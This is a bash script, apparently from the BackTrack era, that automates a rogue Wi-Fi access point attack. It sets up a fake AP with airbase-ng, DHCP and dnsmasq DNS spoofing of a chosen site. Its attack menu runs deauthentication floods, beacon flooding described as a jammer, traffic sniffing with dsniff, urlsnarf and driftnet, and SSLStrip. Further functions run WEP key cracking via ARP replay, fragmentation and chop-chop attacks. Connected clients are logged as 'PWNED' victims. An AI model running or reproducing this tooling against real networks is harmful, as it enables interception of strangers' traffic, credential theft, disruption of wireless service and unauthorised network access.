#!/bin/bash
# Hacker Busters - accesspoint.sh         Copyright(c) 2012 Hacker Busters, Inc.
#                                                           All rights Reserved.
# copyright@hackerbusters.ca                            http://hackerbusters.ca
####################
# GLOBAL VARIABLES #
####################
REVISION=045
function todo(){
echo "TODO LIST FOR NEWER REVISIONS"
echo "- Fix For Ping Victim"
echo "- Cleanup Errors On Script Exit"
}
####################
#  CONFIG SECTION  #
####################
AUTOMODE=TRUE              #You Can Set AutoMode To TRUE | FALSE
at0IP=192.168.0.1          #ip address of moniface
NETMASK=255.255.0.0        #subnetmask
WILDCARD=0.0.255.255       #dunno what this is
# =>
# NETWORK=/16
at0IPBLOCK=192.168.0.0     #subnet
DHCPS=192.168.0.1          #dhcp start range
DHCPE=192.168.255.254      #dhcp end range
BROADCAST=192.168.255.255  #broadcast address
# Hosts/Net 65534          #CLASS C, Private Internet
DHCPL=1h                   #time for dhcp lease
folder=`pwd`/SESSION_$RANDOM
sslstrip=`which sslstrip`
######################
# END CONFIG SECTION #
######################
function automode(){
mkdir $folder
monitormodestop
mode=1
verbose=0
ATHIFACE=wlan0
ESSID=WiFi
CHAN=1
MTU=1500
PPS=100
BEAINT=50
WIFILIST=
OTHEROPTS=
MAC=$(ifconfig $ATHIFACE | awk '/HWaddr/ { print $5 }')
SPOOFMAC=
DHCPSERVER=1
DNSURL=#
}
OK=`printf "\e[1;32m OK \e[0m"`
FAIL=`printf "\e[1;31mFAIL\e[0m"`
function control_c(){
echo ""
echo ""
echo "CTRL+C Was Pressed..."
echo ""
stopshit
monitormodestop
kill `cat $folder/probe.pid` &>/dev/null
kill `cat $folder/pwned.pid` &>/dev/null
kill `cat $folder/web.pid` &>/dev/null
cleanup
exit 0
}
trap control_c SIGINT
function cleanup(){
rm -rf $folder
mv $APACHECONF/default~ $APACHECONF/default
dhcpconf=/etc/dhcp3/dhcpd.conf
echo > $dhcpconf
echo > /etc/dnsmasq.conf
mv /etc/resolv.conf~ /etc/resolv.conf
}
function pinginternet(){
echo "Pinging Google [8.8.8.8] with 64 bytes of data:"
INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 10))
if [ "$INTERNETTEST" = "64" ]; then echo "Reply from 8.8.8.8: bytes=64"; else echo "Request timed out."; fi
}
function pinggateway(){
GATEWAYRDNS=$(route | awk '/UG/ { print $2 }')
GATEWAY=$(route -n | awk '/UG/ { print $2 }')
echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 10))
if [ "$GATEWAYTEST" = "64" ]; then echo "Reply from $GATEWAY: bytes=64"; else echo "Request timed out."; fi
}
function pingvictim(){
echo "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
ping $VICTIM -c 20 -W 1 | awk '/bytes from/ { print $5 }'
}
function checkupdate(){
echo "+===================================+"
echo "| RUNNING SCRIPT UPDATE CHECK       |"
echo "+===================================+"
pinginternet
if [ "$INTERNETTEST" != "64" ]; then echo "| [$FAIL] No Internet Connection";
else
newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/README | grep REVISION= | cut -d'=' -f2)
if [ "$newrevision" -gt "$REVISION" ]; then update; fi
else
echo ""
echo "#####################################"
echo "# NO UPDATE IS REQUIRED             #"
echo "#####################################"; fi
fi
}
function update(){
echo ""
echo "#####################################"
echo "# PLEASE UPDATE THIS SCRIPT         #"
echo "#####################################"
stopshit
echo "Attempting To Update"
wget -nv -t 1 -T 10 -O accesspoint.sh.tmp https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/accesspoint.sh
if [ -f accesspoint.sh.tmp ]; then rm accesspoint.sh; mv accesspoint.sh.tmp accesspoint.sh;
echo "CHMOD & EXIT"
chmod 755 accesspoint.sh
read -e -p "Update [$OK] " enter
exit 0
else
echo "Update [$FAIL]..."
read -e -p "Try Again? " enter
update
fi
}
function stopshit(){
service apache2 stop &>/dev/null
service dhcp3-server stop &>/dev/null
service dnsmasq stop &>/dev/null
service network-manager stop &>/dev/null
killall -9 aircrack-ng airodump-ng aireplay-ng airbase-ng wireshark mdk3 dnsmasq driftnet urlsnarf dsniff &>/dev/null
killall -9 dhclient dhclient3 NetworkManager wpa_supplicant &>/dev/null
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "0" > /proc/sys/net/ipv4/ip_forward
}
function firewall(){
iptables -P FORWARD ACCEPT
iptables -A FORWARD -i at0 -j ACCEPT
echo "1" > /proc/sys/net/ipv4/ip_forward
}
function dhcpd3server(){
echo "| DHCPD3 SERVER!!!"
replace INTERFACES=\"\" INTERFACES=\"at0\" -- /etc/default/dhcp3-server
echo "" > /var/lib/dhcp3/dhcpd.leases
mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd;
dhcpconf=/etc/dhcp3/dhcpd.conf
echo "ddns-update-style none;" >> $dhcpconf
echo "default-lease-time 600;" > $dhcpconf
echo "max-lease-time 7200;" >> $dhcpconf
echo "" >> $dhcpconf
echo "log-facility local7;" >> $dhcpconf
#echo "local7.* $folder/dhcpd.log" > /etc/rsyslog.d/dhcpd.conf
echo "" >> $dhcpconf
echo "authoritative;" >> $dhcpconf
echo "" >> $dhcpconf
# echo "shared-network NetworkName {" >> $dhcpconf
echo "subnet $at0IPBLOCK netmask $NETMASK {" >> $dhcpconf
# echo "option subnet-mask $NETMASK;" >> $dhcpconf
# echo "option broadcast-address $BROADCAST;" >> $dhcpconf
echo "option domain-name backtrack-linux;" >> $dhcpconf
echo "option domain-name-servers $at0IP;" >> $dhcpconf
echo "option routers $at0IP;" >> $dhcpconf
echo "range $DHCPS $DHCPE;" >> $dhcpconf
echo "allow unknown-clients;" >> $dhcpconf
echo "one-lease-per-client false;" >> $dhcpconf
echo "}" >> $dhcpconf
# echo "}" >> $dhcpconf
gnome-terminal --geometry=130x15 --hide-menubar --title=DHCP-"$ESSID" -e \
"dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/at0.pid at0"
}
function dnsmasqserver(){
echo "address=/$DNSURL/$at0IP" > /etc/dnsmasq.conf
echo "dhcp-authoritative" >> /etc/dnsmasq.conf
echo "domain-needed" >> /etc/dnsmasq.conf
echo "domain=wirelesslan" >> /etc/dnsmasq.conf
echo "server=/wirelesslan/" >> /etc/dnsmasq.conf
echo "localise-queries" >> /etc/dnsmasq.conf
echo "log-queries" >> /etc/dnsmasq.conf
echo "log-dhcp" >> /etc/dnsmasq.conf
echo "" >> /etc/dnsmasq.conf
# echo "interface=at0" >> /etc/dnsmasq.conf
echo "dhcp-leasefile=$folder/dnsmasq.leases" >> /etc/dnsmasq.conf
echo "resolv-file=$folder/resolv.conf" >> /etc/dnsmasq.conf
echo "stop-dns-rebind" >> /etc/dnsmasq.conf
# echo "rebind-localhost-ok" >> /etc/dnsmasq.conf
echo "dhcp-range=$DHCPS,$DHCPE,$NETMASK,$DHCPL" >> /etc/dnsmasq.conf
echo "dhcp-option=wirelesslan,3,$at0IP" >> /etc/dnsmasq.conf
echo "dhcp-host=$MAC,$at0IP" >> /etc/dnsmasq.conf
echo "nameserver $at0IP" > $folder/resolv.conf
if [ "$mode" = "1" ]; then startdnsmasq; fi
if [ "$mode" = "2" ]; then startdnsmasqresolv; fi

}
function udhcpdserver(){
gnome-terminal --geometry=130x15 --hide-menubar --title=DHCP-"$ESSID" -e \
"udhcpd"
}
function brlan(){
brctl addbr br-lan
brctl addif br-lan $LANIFACE
brctl addif br-lan at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig br-lan up
echo "+===================================+"
echo "| ATTEMPTING TO BRIDGE ON $LANIFACE (br-lan)"
echo "+===================================+"
dhclient3 br-lan &>/dev/null
sleep 5
brctl show > $folder/bridged.txt
}
function lanifacemenu(){
echo "+===================================+"
echo "| SHOWING IFCONFIG"
echo "+===================================+"
echo ""
ifconfig | grep HWaddr
echo ""
read -e -p "interface with connection to internet (eth0 eth1......) " LANIFACE
brlan
}
function monitormodestop(){
echo "+===================================+"
echo "| ATTEMPTING TO STOP (monitor-mode)"
echo "+===================================+"
if [ "$ATHIFACE" = "" ]; then 
ATHIFACE=`ifconfig wlan | awk '/encap/ {print $1}'`
fi
if [ "$MONIFACE" = "" ]; then
MONIFACE=mon0
fi
airmon-ng stop $ATHIFACE &>/dev/null;
airmon-ng stop $MONIFACE &>/dev/null;
ifconfig $ATHIFACE down
sleep 2
}
function monitormodestart(){
airmon-ng check kill > $folder/monitormodepslist.txt
ifconfig $ATHIFACE down
iwconfig $ATHIFACE channel $CHAN
ifconfig $ATHIFACE up
echo "+===================================+"
echo "| ATTEMPTING TO START (monitor-mode) ON $ATHIFACE"
echo "+===================================+"
airmon-ng start $ATHIFACE > $folder/monitormode.txt
MONIFACE=`awk '/enabled/ { print $5 }' $folder/monitormode.txt | head -c -2`
ifconfig $MONIFACE down
sleep 2
iwconfig $MONIFACE channel $CHAN
if [ "$SPOOFMAC" != "" ]; then
macchanger -m $SPOOFMAC $MONIFACE
fi
ifconfig $MONIFACE up
echo "| Monitor Mode Enabled On $MONIFACE (CH: $CHAN)"
echo "+===================================+"
}
function poisonmenu(){
echo "+===================================+"
echo "| Choose You're Poison?             |"
echo "+===================================+"
echo "| 1) Webserver Mode | *DEFAULT*      "
echo "| 2) Attack Mode | Man In The Middle "
echo "| 3) IRC Mode | IRC Server Required  "
echo "| 4) Capture IVs For WEP Attack      "
echo "| U) Update Script To The Latest     "
echo "| Q) Quit Mode | YOU SUCK LOOSER     "
echo "+===================================+"
echo ""
read -e -p "Option: " mode
echo ""
if [ "$mode" = "" ]; then clear; poisonmenu; fi
if [ "$mode" = "U" ]; then update; fi
if [ "$mode" = "Q" ]; then echo "QUITER!!!!!!!!!!!!!"; sleep 5; exit 0; fi
mkdir $folder
}
function verbosemenu(){
echo "+===================================+"
echo "| Verbosity Level?                  |"
echo "+===================================+"
echo "| 0) Use Default Settings *CAUTION*  "
echo "| 1) Answer Some Questions To Setup  "
echo "| 2) Puts AirBase-NG Into Verbose    "
echo "+===================================+"
echo ""
read -e -p "Option: " verbose
echo ""
if [ "$verbose" = "" ]; then clear; verbosemenu; fi
}
function dhcpmenu(){
echo "+===================================+"
echo "| DHCP SERVER MENU                  |"
echo "+===================================+"
echo "| 1) DNSMASQ"
echo "| 2) DHCPD3-SERVER"
echo "| 3) UDHCPD"
echo "| 4) MitM No DHCP Server Use This"
echo "+===================================+"
echo ""
read -e -p "Option: " DHCPSERVER
echo ""
if [ "$DHCPSERVER" = "" ]; then clear; dhcpmenu; fi
}
function attackmenu(){
clear
echo "+===================================+"
echo "| MAIN ATTACK MENU                  |"
echo "+===================================+"
echo "| 1) Deauth"
echo "| 2) Wireshark"
echo "| 3) DSniff"
echo "| 4) URLSnarf"
echo "| 5) Driftnet"
echo "| 6) SSLStrip"
echo "| 7) Beacon Flood (WIFI JAMMER)"
echo "| 8) Exit and leave everything running"
echo "| 9) Exit and cleanup"
echo "+===================================+"
echo ""
read -e -p "Option: " attack
if [ "$attack" = "" ]; then clear; attackmenu; fi
}
function startdnsmasq(){
echo "no-poll" >> /etc/dnsmasq.conf
echo "no-resolv" >> /etc/dnsmasq.conf
echo "| DNSMASQ DNS POISON!!!             |"
gnome-terminal --geometry=133x35 --hide-menubar --title=DNSERVER -e "dnsmasq --no-daemon -C /etc/dnsmasq.conf"
}
function startdnsmasqresolv(){
echo "dhcp-option=lan,6,$at0IP,8.8.8.8" >> /etc/dnsmasq.conf
echo "| DNSMASQ With Internet             |"
gnome-terminal --geometry=134x35 --hide-menubar --title=DNSERVER -e \
"dnsmasq --no-daemon --interface=at0 --except-interface=lo -C /etc/dnsmasq.conf"
}
function nodhcpserver(){
echo "Not Using A Local DHCP Server For MitM"
}
function taillogs(){
echo > /var/log/syslog
# for (i=9; i<=NF; i++)
echo "echo \$$ > $folder/probe.pid" > $folder/probe.sh
echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $folder/airbaseng.log)" >> $folder/probe.sh
echo "echo \$$ > $folder/pwned.pid" > $folder/pwned.sh
echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $folder/airbaseng.log) &" >> $folder/pwned.sh
echo "awk '/DHCPACK\\(at0\\)/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
echo "echo \$$ > $folder/web.pid" > $folder/web.sh
#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
chmod a+x $folder/probe.sh
chmod a+x $folder/pwned.sh
chmod a+x $folder/web.sh
gnome-terminal --geometry=134x35 --hide-menubar --title=WEB -e "/bin/bash $folder/web.sh"
gnome-terminal --geometry=134x17 --hide-menubar --title=PWNED -e "/bin/bash $folder/pwned.sh"
gnome-terminal --geometry=134x17 --hide-menubar --title=PROBE -e "/bin/bash $folder/probe.sh"
#VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
#VICTIMIP=
#VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
#gnome-terminal --geometry=130x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
#"tail -f /var/log/apache2/error.log"
}
function deauth(){
echo ""
echo "+===================================+"
echo "| SCANNING NEARBY WIFIS             |"
echo "+===================================+"
iwlist $ATHIFACE scan | awk '/Address/ {print $5}' > $folder/scannedwifimaclist.txt
echo "a/$MAC|any" > $folder/droprules.txt
echo "d/any|any" >> $folder/droprules.txt
echo "$MAC" > $folder/whitelist.txt
isempty=$(ls -l $folder | awk '/scannedwifimaclist.txt/ {print $5}')
read -e -p "List of APs (wifilist.txt) *optional* " WIFILIST
echo ""
echo "+===================================+"
echo "| DEAUTH PEOPLE                      "
echo "+===================================+"
echo "| 1) MDK3 | Murder Death Kill III    "
echo "| 2) AIREPLAY-NG | Aircrack-NG Suite "
echo "| 3) AIRODROP-NG | Aircrack-NG Suite "
echo "+===================================+"
echo ""
read -e -p "Option: " DEAUTHPROG
if [ "$DEAUTHPROG" = "1" ]; then
DEAUTHPROG=mdk3
gnome-terminal --geometry=130x15 --hide-menubar -e "mdk3 $MONIFACE d -c 1,2,3,4,5,6,7,8,9,10,11 -w $folder/whitelist.txt"
fi
if [ "$DEAUTHPROG" = "3" ]; then
DEAUTHPROG=airdrop-ng
gnome-terminal --geometry=130x15 --hide-menubar --title="AIRODUMP-NG" -e \
"airodump-ng --output-format csv --write $FOLDER/dump.csv $MONIFACE"
sleep 5
if [ -f != /usr/sbin/airdrop-ng ]; then
ln -s /pentest/wireless/airdrop-ng/airdrop-ng /usr/sbin/airdrop-ng
fi
gnome-terminal --geometry=130x15 --hide-menubar --title="AIRDROP-NG" -e \
"airdrop-ng -i $MONIFACE -t $folder/dump.csv-01.csv -r $folder/droprules.txt"
fi
if [ "$DEAUTHPROG" = "2" ]; then
DEAUTHPROG=aireplay-ng
echo ""
echo "+===================================+"
echo "| 3) ESSID | ACCESSPOINT NAME        "
echo "| 4) APMAC | MAC ADDRESS OF AP       "
echo "+===================================+"
echo ""
read -e -p "Option: " DEAUTHMODE
if [ "$DEAUTHMODE" = "3" ]; then
gnome-terminal -e "aireplay-ng -0 $COUNT -e \"$ESSID\" $MONIFACE"
fi
if [ "$DEAUTHMODE" = "4" ]; then
echo ""
echo "EXAMPLE: aa:bb:cc:dd:ee:ff"
read -e -p "What Is The APs MAC ADDRESS? " APMAC
gnome-terminal -e "aireplay-ng -0 $COUNT -a $APMAC $MONIFACE"
fi
fi
read -e -p "Press Enter To End Deauth Attack " enter
killall -q -9 $DEAUTHPROG
echo "+===================================+"
echo "| STOP DEAUTH ATTACK                |"
echo "+===================================+"
echo ""
attackmenu
}
function beaconflood(){
if [ -f "$WIFILIST" ]; then
gnome-terminal --geometry=130x15 --hide-menubar --title="Tons Of Wifi APs" -e \
"mdk3 $MONIFACE b -f $WIFILIST"
else
start=0 > $folder/mdk3.sh
read -e -p "how many fake aps would you like? (max 30) " end >> $folder/mdk3.sh
if [ "$end" -gt "30" ]; then >> $folder/mdk3.sh
exit >> $folder/mdk3.sh
fi
read -e -p "what essid? " essid >> $folder/mdk3.sh
while [ $start -lt $end ]; do >> $folder/mdk3.sh
mdk3 $MONIFACE b -n "$essid$RANDOM" >> $folder/mdk3.sh
let start=start+1 >> $folder/mdk3.sh
done >> $folder/mdk3.sh
sleep >> 9999 $folder/mdk3.sh
chmod 755 $folder/mdk3.sh
gnome-terminal --geometry=130x15 --hide-menubar --title="Tons Of Wifi APs" -e \
"$folder/mdk3.sh"
fi
attackmenu
}
# +===================================+
# | ANYTHING UNDER THIS IS UNTESTED   |
# | AND CAN BE USED FOR WEP CRACKING  |
# +===================================+
function capture(){
echo "+===================================+"
echo "| Capturing IVs For $ESSID          |"
echo "+===================================+"
gnome-terminal --geometry=130x15 --hide-menubar --title=CAPTURE-"$ESSID" -e \
"airodump-ng -c $CHAN --bssid $BSSID -w $folder/haxor.cap $MONIFACE"
sleep 5
}
function associate(){
echo "+===================================+"
echo "| Trying To Join ESSID: $ESSID"
echo "+===================================+"
gnome-terminal --geometry=130x15 --hide-menubar --title=JOIN-"$ESSID" -e \
"aireplay-ng -1 0 -e \"$ESSID\" -a \"$BSSID\" -h \"$TARGETMAC\" \"$MONIFACE\" &>/dev/null &"
}
function injectarpclientless(){
echo "+===================================+";
echo "Injecting ARP packets into "$ESSID"";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -3 -b "$BSSID" -h "$MAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function injectarpclient(){
echo "+===================================+";
echo "Injecting Client ARP packets into "$ESSID"";
#xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
#aireplay-ng -2 -b "$BSSID" -d FF:FF:FF:FF:FF:FF -m 68 -n 86 -t 1 -f 1 "$MIFACE" &>/dev/null &
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -3 -b "$BSSID" -h "$CLIENTMAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function randomarpclientless(){
echo "+===================================+";
echo "Injecting a random ARP packet into "$ESSID"";
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "$BSSID" -h "$MAC" -r replay*.cap "$MIFACE" &>/dev/null &
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -m 68 -n 86 -b "$BSSID" -c FF:FF:FF:FF:FF:FF -h "$MAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function randomarpclient(){
echo "+===================================+";
echo "Injecting a random ARP packet into "$ESSID"";
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "$BSSID" -h "$CLIENTMAC" -r replay*.cap "$MIFACE" &>/dev/null &
xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -m 68 -n 86 -b "$BSSID" -c FF:FF:FF:FF:FF:FF -h "$CLIENTMAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function fragclientless(){
echo "+===================================+"
echo "Starting fragmenation attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Fragmenation Attack" -geometry 90x20 -e \
aireplay-ng -5 -b "$BSSID" -h "$MAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function fragclient(){
echo "+===================================+";
echo "Starting fragmenation attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Fragmenation Attack" -geometry 90x20 -e \
aireplay-ng -5 -b "$BSSID" -h "$CLIENTMAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function chopchopclientless(){
echo "+===================================+";
echo "Starting chop chop attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Chop Chop Attack" -geometry 90x20 -e \
aireplay-ng -4 -b "$BSSID" -h "$MAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function chopchopclient(){
echo "+===================================+";
echo "Starting chop chop attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Chop Chop Attack" -geometry 90x20 -e \
aireplay-ng -4 -b "$BSSID" -h "$CLIENTMAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function injectcapturedarpcleintless(){
echo "+===================================+";
echo "Injecting the created ARP packet";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -2 -b "$BSSID" -h "$MAC" -r h4x0r-arp "$MONIFACE" &>/dev/null &
sleep 5;
}
function injectcapturedarpcleint(){
echo "+===================================+";
echo "Injecting the created ARP packet";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -2 -b "$BSSID" -h "$CLIENTMAC" -r h4x0r-arp "$MONIFACE" &>/dev/null &
sleep 5;
}
function xorfragclientless(){
packetforge-ng -0 -a "$BSSID" -h "$MAC" -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w h4x0r-arp
sleep 5;
}
function xorfragclient(){
packetforge-ng -0 -a "$BSSID" -h "$CLIENTMAC" -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w h4x0r-arp
sleep 5;
}
function xorchopchopclientless(){
packetforge-ng -0 -a "$BSSID" -h "$MAC" -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w h4x0r-arp
sleep 5;
}
function xorchopchopclient(){
packetforge-ng -0 -a "$BSSID" -h "$CLIENTMAC" -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w h4x0r-arp
sleep 5;
}
function crackkey(){
echo "+===================================+";
read -p "Hit Enter when you have 10,000 IV's, could take up to 5 min.";
echo "+===================================+";
echo "Starting to H4X0R the WEP key..................";
xterm -hold -bg black -fg blue -T "Cracking" -e aircrack-ng -b "$BSSID" h4x0r*.cap &>/dev/null &
sleep 1;
echo "+===================================+";
echo "You should see the WEP key soon......";
echo "+===================================+";
exit 0
}
function wepattackmenu(){
clear;
echo "******************************************************************";
echo "**************Please select the type of attack below**************";
echo "THIS WILL DELETE ANY PREVIOUS h4x0r.cap* FILE RENAME IT TO KEEP IT";
echo "******************************************************************";
showMenu () {
 echo
 echo "1) ARP request replay attack (clientless)"
 echo "2) NOT TESTED Fragmentation (clientless)"
 echo "3) NOT TESTED Chop Chop (clientless)"
 echo "3) NOT TESTED ARP request replay attack (client)"
 echo "4) NOT TESTED Fragmentation (Client)"
 echo "5) NOT TESTED Chop Chop (client)"
}
while [ 1 ]
do
 showMenu
 read CHOICE
 case "$CHOICE" in
 "1")
  echo "ARP request replay attack (clientless)";
  capture;
  associate;
  injectarpclientless;
  crackkey;
  ;;
 "2")
  echo "Fragmentation (clientless)";
  capture;
  associate;
  fragclientless;
  xorfragclientless;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 "3")
  echo "Chop Chop (clientless)"
  capture;
  associate;
  chopchopclientless;
  xorchopchopclientless;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 "4")
  echo "ARP request replay attack (client)";
  capture;
  associate;
  injectarpclientless;
  injectarpclient;
  crackkey; 
  ;;
 "5")
  echo "Fragmentation (Client)";
  capture;
  fragclient;
  xorfragclient;
  injectcapturedarpcleint;
  crackkey;
  ;;
 "6")
  echo "Chop Chop (client)";
  capture;
  chopchopclient;
  xorchopchopclient;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 esac
done
}
# +===================================+
# | ANYTHING ABOVE THIS IS UNTESTED   |
# +===================================+
mydistro="`awk '{print $1}' /etc/issue`"
myversion="`awk '{print $2}' /etc/issue`"
myrelease="`awk '{print $3}' /etc/issue`"
# Dep Check
echo "#####################################"
echo "# REVISION: $REVISION                     #"
echo "#####################################"
echo ""
echo "#####################################"
if [ "$mydistro" = "BackTrack" ]; then echo "$mydistro Version $myversion Release $myrelease"; fi
if [ "$mydistro" = "Ubuntu" ]; then echo "$mydistro Version $myversion Release $myrelease"; fi
echo "#####################################"
echo ""
checkupdate
echo ""
echo "+===================================+"
echo "| Dependency Check                  |"
echo "+===================================+"
mydns="`which dnsmasq 2> /dev/null`"; if [ "$mydns" != "" ]; then
echo "| [$OK] $mydns"
else
echo "| [$FAIL] /usr/sbin/dnsmasq"
echo "|"
echo "| Attempting To apt-get install DNSMASQ"
echo "|"
read -e -p "Please Connect To The Internet Now And Press Enter" enter
apt-get install dnsmasq -y -q
echo "| Done"
fi
if [ "$mydistro" = "BackTrack" ]; then mydhcpd="`which dhcpd3 2> /dev/null`"; fi 
if [ "$mydistro" != "BackTrack" ]; then mydhcpd="`which dhcpd 2> /dev/null`"; fi
if [ "$mydhcpd" != "" ]; then echo "| [$OK] $mydhcpd";
else
echo "| [$FAIL] /usr/sbin/dhcpd3"
echo "|"
echo "| Attempting To apt-get install DHCPD3"
echo "|"
read -e -p "Please Connect To The Internet Now And Press Enter" enter
apt-get install dhcp3-server -y -q
apt-get install dhcp3-common -y -q
echo "| Done"
echo "|"
fi
type -P dnsmasq &>/dev/null || { echo "| [$FAIL] dnsmasq";} 
type -P dhcpd3 &>/dev/null || { echo "| [$FAIL] dhcpd3";}
type -P aircrack-ng &>/dev/null || { echo "| [$FAIL] aircrack-ng";}
type -P airdrop-ng &>/dev/null || { echo "| [$FAIL] airdrop-ng";}
type -P xterm &>/dev/null || { echo "| [$FAIL] xterm";}
type -P iptables &>/dev/null || { echo "| [$FAIL] iptables";}
type -P ettercap &>/dev/null || { echo "| [$FAIL] ettercap";}
type -P arpspoof &>/dev/null || { echo "| [$FAIL] arpspoof";}
type -P sslstrip &>/dev/null || { echo "| [$FAIL] sslstrip";}
type -P driftnet &>/dev/null || { echo "| [$FAIL] driftnet";}
type -P urlsnarf &>/dev/null || { echo "| [$FAIL] urlsnarf";}
type -P dsniff &>/dev/null || { echo "| [$FAIL] dsniff";}
type -P python &>/dev/null || { echo "| [$FAIL] python";}
type -P macchanger &>/dev/null || { echo "| [$FAIL] macchanger";}
type -P msfconsole &>/dev/null || { echo "| [$FAIL] metasploit";}
# apt-get install python-dev
echo "+===================================+"
stopshit
modprobe tun
echo ""
if [ "$AUTOMODE" = "FALSE" ]; then poisonmenu; fi
if [ "$AUTOMODE" = "FALSE" ]; then verbosemenu; fi
if [ "$AUTOMODE" = "FALSE" ]; then dhcpmenu; fi
if [ "$AUTOMODE" = "TRUE" ]; then automode;
else
monitormodestop
echo ""
echo "+===================================+"
echo "| Listing Wireless Devices          |"
echo "+===================================+"
airmon-ng | awk '/wlan/'
airmon-ng | awk '/ath/'
airmon-ng | awk '/mon/'
echo "+===================================+"
echo ""
echo "Pressing Enter Uses Default Settings"
echo ""
read -e -p "RF Moniter Interface [wlan0]: " ATHIFACE
if [ "$ATHIFACE" = "" ]; then ATHIFACE=wlan0; fi
ifconfig $ATHIFACE up
MAC=$(ifconfig $ATHIFACE | awk '/HWaddr/ { print $5 }')
read -e -p "Spoof MAC Addres For $ATHIFACE [$MAC]: " SPOOFMAC
read -e -p "What SSID Do You Want To Use [WiFi]: " ESSID
if [ "$ESSID" = "" ]; then ESSID=WiFi; fi
read -e -p "What CHANNEL Do You Want To Use [1]: " CHAN
if [ "$CHAN" = "" ]; then CHAN=1; fi
read -e -p "Select your MTU setting [1500]: " MTU
if [ "$MTU" = "" ]; then MTU=1500; fi
if [ "$MODE" = "4" ]; then 
read -e -p "Targets MAC Address: " TARGETMAC
fi
read -e -p "Beacon Intervals [50]: " BEAINT
if [ "$BEAINT" = "" ]; then BEAINT=50; fi
if [ "$BEAINT" -lt "10" ]; then BEAINT=50; fi
read -e -p "Packets Per Second [100]: " PPS
if [ "$PPS" = "" ]; then PPS=100; fi
if [ "$PPS" -lt "100" ]; then PPS=100; fi
read -e -p "Other AirBase-NG Options [none]: " OTHEROPTS
read -e -p "DNS Spoof What Website [#]: " DNSURL
if [ "$DNSURL" = "" ]; then DNSURL=\#; fi
fi
echo ""
monitormodestart
if [ "$mode" = "4" ]; then wepattackmenu; fi
if [ "$mode" = "2" ]; then
lanifacemenu
fi
echo "+===================================+"
echo "| STARTING ACCESS POINT: $ESSID "
echo "| IP: $at0IP "
if [ "$verbose" -gt "0" ]; then
echo "| BSSID: $MAC "
echo "| CHANNEL: $CHAN "
echo "| PACKETS PER SECOND: $PPS "
echo "| BEACON INTERVAL: $BEAINT "
echo "| MONITOR INTERFACE: $MONIFACE "
fi
echo "+===================================+"
airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT $OTHEROPTS $MONIFACE -P -C 15 -v > $folder/airbaseng.log &
